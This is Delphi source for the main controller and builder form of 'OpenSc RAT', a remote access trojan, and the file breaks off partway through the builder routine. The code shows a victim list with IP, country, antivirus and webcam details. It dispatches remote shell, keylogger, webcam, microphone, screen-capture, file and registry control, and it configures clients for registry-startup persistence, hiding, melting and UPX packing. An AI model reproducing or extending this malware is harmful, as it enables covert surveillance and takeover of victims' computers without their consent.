unit UnitMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Spin, ComCtrls, ExtCtrls, XPMan, Menus, ExtCtrlsX, ImgList,
  SocketUnitEx, uJSONConfig, UnitCommands, UnitUtils, UnitCountry, UnitGeoIP,
  UnitEncryption, UnitConfiguration;

type
  TFormMain = class(TForm)
    pgcMain: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    ts3: TTabSheet;
    lvConnections: TListView;
    grp1: TGroupBox;
    lvPorts: TListView;
    sePort: TSpinEdit;
    btn1: TButton;
    grp2: TGroupBox;
    edtEncryption: TEdit;
    chkStartup: TCheckBox;
    pgc2: TPageControl;
    ts4: TTabSheet;
    ts5: TTabSheet;
    ts6: TTabSheet;
    lbl1: TLabel;
    edtDNS: TEdit;
    lbl2: TLabel;
    sePort2: TSpinEdit;
    btn3: TButton;
    lvDNS: TListView;
    lbl3: TLabel;
    edtEncryption2: TEdit;
    stat1: TStatusBar;
    ts7: TTabSheet;
    chkInstallation: TCheckBox;
    grpInstallation: TGroupBox;
    cbbDestination: TComboBoxEx;
    lbl4: TLabel;
    lbl5: TLabel;
    edtFolder: TEdit;
    lbl6: TLabel;
    edtFile: TEdit;
    chkRegStartup: TCheckBox;
    grpStartup: TGroupBox;
    lbl9: TLabel;
    edtValue: TEdit;
    chkHKLM: TCheckBox;
    chkHKCU: TCheckBox;
    chkHide: TCheckBox;
    chkTime: TCheckBox;
    chkPersistence: TCheckBox;
    chkKeylogger: TCheckBox;
    btn2: TButton;
    chkSave: TCheckBox;
    xpmnfst1: TXPManifest;
    seDelay: TSpinEdit;
    lbl7: TLabel;
    lbl8: TLabel;
    ts8: TTabSheet;
    mmo1: TMemo;
    pm1: TPopupMenu;
    F1: TMenuItem;
    R1: TMenuItem;
    T1: TMenuItem;
    N1: TMenuItem;
    S1: TMenuItem;
    W1: TMenuItem;
    K1: TMenuItem;
    S2: TMenuItem;
    N2: TMenuItem;
    C1: TMenuItem;
    C2: TMenuItem;
    R2: TMenuItem;
    M1: TMenuItem;
    C3: TMenuItem;
    N3: TMenuItem;
    M2: TMenuItem;
    trycn1: TTrayIcon;
    ilFlags: TImageList;
    pm2: TPopupMenu;
    R4: TMenuItem;
    C4: TMenuItem;
    O1: TMenuItem;
    N4: TMenuItem;
    ts9: TTabSheet;
    edtId: TEdit;
    lbl10: TLabel;
    lbl11: TLabel;
    U1: TMenuItem;
    pm3: TPopupMenu;
    R3: TMenuItem;
    chkMelt: TCheckBox;
    chk3: TCheckBox;
    chkUpx: TCheckBox;
    lbl12: TLabel;
    edtMutex: TEdit;
    btn4: TButton;
    lbl13: TLabel;
    il1: TImageList;
    dlgSave1: TSaveDialog;
    lbl15: TLabel;
    edtClient: TEdit;
    btn5: TButton;
    dlgOpen1: TOpenDialog;
    ts10: TTabSheet;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure R4Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure C4Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure F1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure W1Click(Sender: TObject);
    procedure K1Click(Sender: TObject);
    procedure M1Click(Sender: TObject);
    procedure C3Click(Sender: TObject);
    procedure M2Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure U1Click(Sender: TObject);
    procedure chk3Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure chkInstallationClick(Sender: TObject);
    procedure chkRegStartupClick(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
  private
    { Private declarations }       
    procedure GetListeningPorts;
    procedure GetTotalConnected;
  public
    { Public declarations }
    procedure OnClientConnect(Sender: TObject; ClientSocket: TClientSocket);
    procedure OnClientDisconnect(Sender: TObject; ClientSocket: TClientSocket);   
    procedure OnClientRead(Sender: TObject; ClientSocket: TClientSocket; Datas: string);
  end;

var
  FormMain: TFormMain;

implementation

uses
  UnitFilesManager, UnitRegistryManager, UnitTasksManager, UnitShell, UnitScreen,
  UnitWebcam, UnitKeylogger, UnitMicrophone, UnitChat, UnitMiscellaneous, UnitConnection;

{$R *.dfm}

procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction); //save settings when closing application
var
  Config: TJSONConfig;
  TmpStr: string;
  i: Integer;
begin
  for i := 0 to lvPorts.Items.Count -1 do //get all ports in lvPorts
    TmpStr := TmpStr + lvPorts.Items.Item[i].Caption + '|';

  Config := TJSONConfig.Create(ExtractFilePath(ParamStr(0)) + 'Server.settings', MainPassword);
  Config.WriteBool('Listening on startup', chkStartup.Checked);
  Config.WriteString('Encryption password', edtEncryption.Text);
  Config.WriteString('Ports list', TmpStr);
  Config.WriteString('Client file', edtClient.Text);
  Config.SaveConfig; //save settings and free our variable
  Config.Free;
end;

procedure TFormMain.FormCreate(Sender: TObject);
var
  Config: TJSONConfig;
  ClientSocket: TClientSocket; //for test connection
  TmpItem: TListItem;  
  TmpList, TmpList1: TStringArray;
  TmpStr: string;
  i: Integer;
begin
  //load saved server settings
  Config := TJSONConfig.Create(ExtractFilePath(ParamStr(0)) + 'Server.settings', MainPassword);
  Config.LoadConfig; //load unencypted settings
  chkStartup.Checked := Config.ReadBool('Listening on startup'); //default value is FALSE
  edtEncryption.Text := Config.ReadString('Encryption password'); //default value is empty string
  edtClient.Text := Config.ReadString('Client file');
  TmpStr := Config.ReadString('Ports list');
  Config.Free;

  while TmpStr <> '' do //fill lvPorts with saved ports
  begin
    i := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1)); //split ports number
    Delete(TmpStr, 1, Pos('|', TmpStr));

    TmpItem := lvPorts.Items.Add;
    TmpItem.Caption := IntToStr(i);
    TmpItem.ImageIndex := 1;

    if chkStartup.Checked then //try to open port automatically if chkStartup is checked
    if OpenPort(i) then TmpItem.SubItems.Add('Listening') else TmpItem.SubItems.Add('Closed');
  end;
  
  GetListeningPorts; //refresh listening ports list

  //-----

  //now load saved builder profile
  Config := TJSONConfig.Create(ExtractFilePath(ParamStr(0)) + 'Builder.profile', MainPassword);
  Config.LoadConfig;

  edtId.Text := Config.ReadString('Client Id');

  TmpStr := edtId.Text;
  chk3.Checked := Pos('%ID%', TmpStr) > 0;

  TmpStr := Config.ReadString('Host list');
  TmpList := ParseString('|', TmpStr); //parse hosts list

  for i := 0 to Length(TmpList) -1 do
  begin
    TmpList1 := ParseString(':', TmpList[i]);

    TmpItem := lvDNS.Items.Add;
    TmpItem.Caption := TmpList1[0];
    TmpItem.SubItems.Add(TmpList1[1]);
    TmpItem.ImageIndex := 0;

    //check connection in the same time
    try
      ClientSocket := TClientSocket.Create;
      ClientSocket.Connect(TmpList1[0], StrToInt(TmpList1[1]));
      if ClientSocket.Connected = False then TmpItem.SubItems.Add('Dead') else
        TmpItem.SubItems.Add('Alive')
    finally
      ClientSocket.Disconnect;
      ClientSocket.Free;
      ClientSocket := nil;
    end;
  end;

  edtEncryption2.Text := Config.ReadString('Encryption key');
  edtFolder.Text := Config.ReadString('Folder');
  edtFile.Text := Config.ReadString('Filename');
  edtValue.Text := Config.ReadString('Startup value');

  seDelay.Value := Config.ReadInteger('Delay');
  cbbDestination.ItemIndex := Config.ReadInteger('Destination');

  chkInstallation.Checked := Config.ReadBool('Installation');
  chkRegStartup.Checked := Config.ReadBool('Startup');
  chkHKLM.Checked := Config.ReadBool('HKLM');
  chkHKCU.Checked := Config.ReadBool('HKCU');
  chkHide.Checked := Config.ReadBool('Hide');
  chkMelt.Checked := Config.ReadBool('Melt');
  chkPersistence.Checked := Config.ReadBool('Persistence');
  chkTime.Checked := Config.ReadBool('Creation time');
  chkKeylogger.Checked := Config.ReadBool('Keylogger');

  Config.Free;
end;

procedure TFormMain.FormShow(Sender: TObject);
begin
  pgcMain.ActivePageIndex := 0; //set active page to Connections page
  pgc2.ActivePageIndex := 0;

  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;
       
procedure TFormMain.btn1Click(Sender: TObject); //try to open choosed port in sePort
var
  TmpItem: TListItem;
  i: Integer;
begin
  for i := 0 to lvPorts.Items.Count -1 do //check if choosed port is already in lvPorts
  begin
    if lvPorts.Items.Item[i].Caption = sePort.Text then Exit;
    //no reason to continue
  end;

  TmpItem := lvPorts.Items.Add;
  TmpItem.Caption := sePort.Text;
  TmpItem.ImageIndex := 1;

  if OpenPort(sePort.Value) then TmpItem.SubItems.Add('Listening') else
    TmpItem.SubItems.Add('Closed'); //if failed to open port, so we can remove port entrie in lvPorts
  GetListeningPorts; //refresh listening ports list
end;

procedure TFormMain.O1Click(Sender: TObject);
begin
  if not Assigned(lvPorts.Selected) then Exit;
  if lvPorts.Selected.SubItems[0] = 'Listening' then Exit; //port is already open
  if OpenPort(StrToInt(lvPorts.Selected.Caption)) then lvPorts.Selected.SubItems[0] := 'Listening' else
    lvPorts.Selected.SubItems[0] := 'Closed';  
  GetListeningPorts; //refresh listening ports list
end;                                                                    

procedure TFormMain.C4Click(Sender: TObject); //close selected port
begin
  if not Assigned(lvPorts.Selected) then Exit;
  if lvPorts.Selected.SubItems[0] = 'Closed' then Exit; //port is already closed
  ClosePort(sePort.Value);
  lvPorts.Selected.SubItems[0] := 'Closed';  
  GetListeningPorts; //refresh listening ports list
end;

procedure TFormMain.R4Click(Sender: TObject); //remove port from lvPorts
begin
  if not Assigned(lvPorts.Selected) then Exit;
  if lvPorts.Selected.SubItems[0] <> 'Closed' then ClosePort(sePort.Value); //if open, close it before
  lvPorts.Selected.Delete;
  GetListeningPorts; //refresh listening ports list
end;

procedure TFormMain.GetListeningPorts; //set status bar fisrt item value with listening ports
var
  TmpStr: string;
  i: Integer;
begin
  for i := 0 to lvPorts.Items.Count -1 do
  begin
    if lvPorts.Items.Item[i].SubItems[0] = 'Closed' then Continue; //we need that port being open
    TmpStr := TmpStr + lvPorts.Items.Item[i].Caption + ', ';
  end;

  if TmpStr = '' then TmpStr := 'None' else //no port is open
  Delete(TmpStr, LastDelimiter(',', TmpStr), Length(TmpStr));
  //to avoid having 1, 2, 3, .., we delete last , so result will be 1, 2, 3, ..

  stat1.Panels.Items[0].Text := 'Listening ports: ' + TmpStr;
end;

procedure TFormMain.GetTotalConnected; //set status bar second item value with total of connections
begin
  stat1.Panels.Items[1].Text := 'Total connections: ' + IntToStr(lvConnections.Items.Count); 
end;

procedure TFormMain.OnClientConnect(Sender: TObject; ClientSocket: TClientSocket);
begin
  //no stuff here
end;

procedure TFormMain.OnClientDisconnect(Sender: TObject; ClientSocket: TClientSocket);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  ClientDatas := TClientDatas(ClientSocket.Data); //check if data was set
  if ClientDatas = nil then
  begin
    ClientSocket.Disconnect; //if not just close connection
    Exit;
  end;

  //show notification
  trycn1.BalloonFlags := bfWarning;
  trycn1.BalloonTitle := 'OpenSc RAT';
  trycn1.BalloonHint := 'Client [' + ClientDatas.ClientSocket.RemoteAddress + '] disconnected.';
  trycn1.ShowBalloonHint;

  //close forms
  if ClientDatas.Forms[0] <> nil then TFormFilesManager(ClientDatas.Forms[0]).Close;
  if ClientDatas.Forms[1] <> nil then TFormRegistryManager(ClientDatas.Forms[1]).Close;
  if ClientDatas.Forms[2] <> nil then TFormTasksManager(ClientDatas.Forms[2]).Close;
  if ClientDatas.Forms[3] <> nil then TFormShell(ClientDatas.Forms[3]).Close;
  if ClientDatas.Forms[4] <> nil then TFormScreen(ClientDatas.Forms[4]).Close;  
  if ClientDatas.Forms[5] <> nil then TFormWebcam(ClientDatas.Forms[5]).Close;  
  if ClientDatas.Forms[6] <> nil then TFormKeylogger(ClientDatas.Forms[6]).Close;
  if ClientDatas.Forms[7] <> nil then TFormMicrophone(ClientDatas.Forms[7]).Close;  
  if ClientDatas.Forms[8] <> nil then TFormChat(ClientDatas.Forms[8]).Close;    
  if ClientDatas.Forms[9] <> nil then TFormMiscellaneous(ClientDatas.Forms[9]).Close;

  //remove and free clientdatas
  ClientDatas.Item.Delete;
  ClientDatas.Free;
  ClientDatas := nil;

  //close clientsocket
  ClientSocket.Data := nil;
  ClientSocket.Disconnect;

  GetTotalConnected; //refresh number of connections
end;

procedure TFormMain.OnClientRead(Sender: TObject; ClientSocket: TClientSocket; Datas: string);
var
  ClientDatas: TClientDatas;
  Cmd, i: Integer;
  TmpItem: TListItem;                     
  TmpList: TStringArray;
  TmpStr: string;
begin
  //check if datas is encrypted
  if edtEncryption.Text <> '' then Datas := DecryptString(Datas, edtEncryption.Text);

  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1)); //get cmd id before
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_CONNECTION_ADD: //set clientdatas as id for this current connection
    begin
      ClientDatas := TClientDatas.Create; //initialize clientdatas
      ClientDatas.ClientSocket := ClientSocket;
      ClientDatas.Item := nil;
      for i := 0 to High(ClientDatas.Forms) -1 do ClientDatas.Forms[i] := nil;
      ClientSocket.Data := ClientDatas;

      //ask main client infos
      ClientDatas.SendDatas(IntToStr(CMD_MAININFOS) + '|');
    end;

    CMD_MAININFOS:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if ClientDatas = nil then Exit; //check if clientsocket has been initialized

      //parse received datas
      TmpList := ParseString('|', Datas);

      lvConnections.Items.BeginUpdate;
      TmpItem := lvConnections.Items.Add;
      TmpItem.Caption := TmpList[0]; //client id

      //check if "GeoIP.dat"  file is in current path
      if not FileExists('GeoIP.dat') then TmpStr := GetCountryName(TmpList[1]) else
      begin
        TmpStr := GeoIpCountryName('GeoIP.dat', ClientDatas.ClientSocket.RemoteAddress);
        if TmpStr = '-' then TmpStr := GetCountryName(TmpList[1]);
        //if failed to get country with GeoIP database get it using countrycode
      end;

      TmpItem.SubItems.Add(TmpStr); //country
      TmpItem.SubItems.Add(ClientDatas.ClientSocket.RemoteAddress); //ip address
      TmpItem.SubItems.Add(TmpList[2]); //os
      TmpItem.SubItems.Add(TmpList[3]); //antivirus
      TmpItem.SubItems.Add(TmpList[4]); //firewall
      TmpItem.SubItems.Add(TmpList[5]); //cam
      TmpItem.SubItems.Add(TmpList[6]); //administrator
      TmpItem.SubItems.Add(TmpList[7]); //active caption

      //check if "GeoIP.dat"  file is in current path
      if not FileExists('GeoIP.dat') then i := GetFlagIndex(TmpList[1]) else
      begin
        i := GeoIpFlagIndex('GeoIP.dat', ClientDatas.ClientSocket.RemoteAddress);
        if i = -1 then i := GetFlagIndex(TmpList[1]);           
        //if failed to get flag index with GeoIP database get it using countrycode
      end;
                                                    
      TmpItem.ImageIndex := i;
      lvConnections.Items.EndUpdate;

      ClientDatas.LocalPort := StrToInt(TmpList[8]); //get localport connection

      TmpItem.Data := ClientDatas; //set lvConnections item data for clientdatas
      ClientDatas.Item := TmpItem;

      //show notification
      trycn1.BalloonFlags := bfInfo;
      trycn1.BalloonTitle := 'OpenSc RAT';
      trycn1.BalloonHint := 'Client [' + ClientDatas.ClientSocket.RemoteAddress + '] connected.';
      trycn1.ShowBalloonHint;

      GetTotalConnected; //refresh number of connections
    end;

    CMD_FILESMANAGER:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[0] = nil) then Exit;
      //read the rest of datas in files manager form only for this clientdatas
      SendMessage(TFormFilesManager(ClientDatas.Forms[0]).Handle, WM_USER + 12, Integer(Datas), 0);
      //sendmessage prevent forms to being frozen when transfering files
    end;

    CMD_REGISTRYMANAGER:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[1] = nil) then Exit;
      TFormRegistryManager(ClientDatas.Forms[1]).OnClientRead(Datas);
    end;

    CMD_TASKSMANAGER:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[2] = nil) then Exit;
      TFormTasksManager(ClientDatas.Forms[2]).OnClientRead(Datas);
    end;

    CMD_SHELL:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[3] = nil) then Exit;
      TFormShell(ClientDatas.Forms[3]).OnClientRead(Datas);
    end;

    CMD_SCREEN:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[4] = nil) then Exit;
      SendMessage(TFormScreen(ClientDatas.Forms[4]).Handle, WM_USER + 12, Integer(Datas), 0);
    end;  

    CMD_WEBCAM:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[5] = nil) then Exit;
      SendMessage(TFormWebcam(ClientDatas.Forms[5]).Handle, WM_USER + 12, Integer(Datas), 0);
    end;
    
    CMD_KEYLOGGER, CMD_CLIPBOARD:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[6] = nil) then Exit;
      TFormKeylogger(ClientDatas.Forms[6]).OnClientRead(Datas);
    end;

    CMD_MICROPHONE:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[7] = nil) then Exit;
      SendMessage(TFormMicrophone(ClientDatas.Forms[7]).Handle, WM_USER + 12, Integer(Datas), 0);
    end;
    
    CMD_CHAT:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[8] = nil) then Exit;
      TFormChat(ClientDatas.Forms[8]).OnClientRead(Datas);
    end;

    CMD_MISCELLANEOUS:
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[9] = nil) then Exit;
      SendMessage(TFormMiscellaneous(ClientDatas.Forms[9]).Handle, WM_USER + 12, Integer(Datas), 0);
    end;
  end;
end;

procedure TFormMain.F1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormFilesManager;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);                         
    //clientdatas must be set for a selected item
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[0] <> nil then TFormFilesManager(ClientDatas.Forms[0]).Show else
    begin
      TmpForm := TFormFilesManager.Create(Self, ClientDatas);
      ClientDatas.Forms[0] := TmpForm; //set forms[0] to filess manager form
      TmpForm.Caption := 'Files manager [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.R1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormRegistryManager;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);  
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[1] <> nil then TFormRegistryManager(ClientDatas.Forms[1]).Show else
    begin
      TmpForm := TFormRegistryManager.Create(Self, ClientDatas);
      ClientDatas.Forms[1] := TmpForm;
      TmpForm.Caption := 'Registry manager [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.T1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormTasksManager;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data); 
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[2] <> nil then TFormTasksManager(ClientDatas.Forms[2]).Show else
    begin
      TmpForm := TFormTasksManager.Create(Self, ClientDatas);
      ClientDatas.Forms[2] := TmpForm;
      TmpForm.Caption := 'Tasks manager [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.S2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormShell;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[3] <> nil then TFormShell(ClientDatas.Forms[3]).Show else
    begin
      TmpForm := TFormShell.Create(Self, ClientDatas);
      ClientDatas.Forms[3] := TmpForm;
      TmpForm.Caption := 'Shell [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.S1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormScreen;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[4] <> nil then TFormScreen(ClientDatas.Forms[4]).Show else
    begin
      TmpForm := TFormScreen.Create(Self, ClientDatas);
      ClientDatas.Forms[4] := TmpForm;
      TmpForm.Caption := 'Screen capture [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.W1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormWebcam;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[5] <> nil then TFormWebcam(ClientDatas.Forms[5]).Show else
    begin
      TmpForm := TFormWebcam.Create(Self, ClientDatas);
      ClientDatas.Forms[5] := TmpForm;
      TmpForm.Caption := 'Webcam capture [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.K1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormKeylogger;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[6] <> nil then TFormKeylogger(ClientDatas.Forms[6]).Show else
    begin
      TmpForm := TFormKeylogger.Create(Self, ClientDatas);
      ClientDatas.Forms[6] := TmpForm;
      TmpForm.Caption := 'Keylogger [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.M1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormMicrophone;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[7] <> nil then TFormMicrophone(ClientDatas.Forms[7]).Show else
    begin
      TmpForm := TFormMicrophone.Create(Self, ClientDatas);
      ClientDatas.Forms[7] := TmpForm;
      TmpForm.Caption := 'Microphone [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.C3Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormChat;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[8] <> nil then TFormChat(ClientDatas.Forms[8]).Show else
    begin
      TmpForm := TFormChat.Create(Self, ClientDatas);
      ClientDatas.Forms[8] := TmpForm;
      TmpForm.Caption := 'Chat [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.M2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormMiscellaneous;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    if ClientDatas.Forms[9] <> nil then TFormMiscellaneous(ClientDatas.Forms[9]).Show else
    begin
      TmpForm := TFormMiscellaneous.Create(Self, ClientDatas);
      ClientDatas.Forms[9] := TmpForm;
      TmpForm.Caption := 'Miscellaneous [' + ClientDatas.ClientSocket.RemoteAddress + ']'; //set window title
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.C2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    ClientDatas.SendDatas(IntToStr(CMD_CONNECTION_CLOSE) + '|'); //close connection
  end;
end;

procedure TFormMain.R2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    ClientDatas.SendDatas(IntToStr(CMD_CONNECTION_RESTART) + '|');
  end;
end;

procedure TFormMain.U1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  if MessageBox(Handle, 'Selected client will be definitively removed from computer.' + #13#10 +
    'Continue anyway?', 'OpenSc RAT', MB_ICONWARNING + MB_YESNO) = IDNO
  then Exit;

  for i := 0 to lvConnections.Items.Count -1 do
  begin
    ClientDatas := TClientDatas(lvConnections.Items.Item[i].Data);
    if (lvConnections.Items.Item[i].Selected = False) or (ClientDatas = nil) then Continue;
    ClientDatas.SendDatas(IntToStr(CMD_CLIENT_UNINSTALL) + '|');
  end;
end;

procedure TFormMain.chk3Click(Sender: TObject);
var
  Tmpstr: string;
begin
  Tmpstr := edtId.Text;
  if Tmpstr = '' then Exit;

  if not chk3.Checked then edtId.Text := MyReplaceStr(Tmpstr, '_%ID%', '') else
  begin
    if Pos('_%ID%', TmpStr) > 0 then Exit;
    edtId.Text := edtId.Text + '_%ID%';
  end;
end;

procedure TFormMain.btn4Click(Sender: TObject);
begin
  edtMutex.Text := 'OpSc_' + RandomString(10);
end;

procedure TFormMain.btn3Click(Sender: TObject);
var
  TmpItem: TListItem;
  ClientSocket: TClientSocket;
begin
  if edtDNS.Text = '' then Exit;
  
  TmpItem := lvDNS.Items.Add;
  TmpItem.Caption := edtDNS.Text;
  TmpItem.SubItems.Add(sePort2.Text);
  TmpItem.ImageIndex := 0;

  try
    ClientSocket := TClientSocket.Create;
    ClientSocket.Connect(edtDNS.Text, sePort2.Value);
    if ClientSocket.Connected = False then TmpItem.SubItems.Add('Dead') else
      TmpItem.SubItems.Add('Alive')
  finally
    ClientSocket.Disconnect;
    ClientSocket.Free;
    ClientSocket := nil;
  end;
end;
      
procedure TFormMain.R3Click(Sender: TObject);
begin
  if not Assigned(lvDNS.Selected) then Exit;
  lvDNS.Selected.Delete;
end;

procedure TFormMain.chkInstallationClick(Sender: TObject);
begin
  grpInstallation.Visible := chkInstallation.Checked;
end;

procedure TFormMain.chkRegStartupClick(Sender: TObject);
begin
  grpStartup.Visible := chkRegStartup.Checked;
end;
     
procedure TFormMain.btn5Click(Sender: TObject);
begin
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.DefaultExt := 'exe';
  dlgOpen1.Filter := 'Client file (*.exe)|*.exe';
  if (dlgOpen1.Execute = False) or (dlgOpen1.FileName = '') then Exit;
  edtClient.Text := dlgOpen1.FileName;
end;

procedure ExecAndWait(FileName: string; ShowCmd: Integer);
var
  SI: TStartupInfo;
  PI: TProcessInformation;
begin
  FillChar(SI, SizeOf(SI), #0);
  SI.cb := SizeOf(SI);
  SI.dwFlags := STARTF_USESHOWWINDOW or STARTF_FORCEONFEEDBACK;
  SI.wShowWindow := ShowCmd;
  if CreateProcess(nil, PChar(Filename), nil, nil, False, $00000010 or $00000020, nil, nil, SI, PI) then
  begin
    WaitForSingleObject(PI.hProcess, INFINITE);
    if PI.hProcess <> 0 then CloseHandle(PI.hProcess);
    if PI.hThread <> 0 then CloseHandle(PI.hThread);
  end;
end;

procedure TFormMain.btn2Click(Sender: TObject);
var
  Config: TJSONConfig;
  ClientFile, TmpStr, TmpStr1: string;
  i: Integer;
begin
  //check client file existence
  if not FileExists(edtClient.Text) then
  begin
    ShowMessage('Client file not found.');
    Exit;
  end;

  //set destination file
  dlgSave1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgSave1.DefaultExt := 'exe';
  dlgSave1.Filter := 'Client file (*.exe)|*.exe';
  dlgSave1.FileName := ExtractFilePath(ParamStr(0)) + 'Client.exe';
  if (dlgSave1.Execute = False) and (dlgSave1.FileName = '') then Exit;
  ClientFile := dlgSave1.FileName;

  //copy client file to destination file
  CopyFile(PChar(edtClient.Text), PChar(ClientFile), False);

  //set configuration
  if edtId.Text <> '' then
  begin
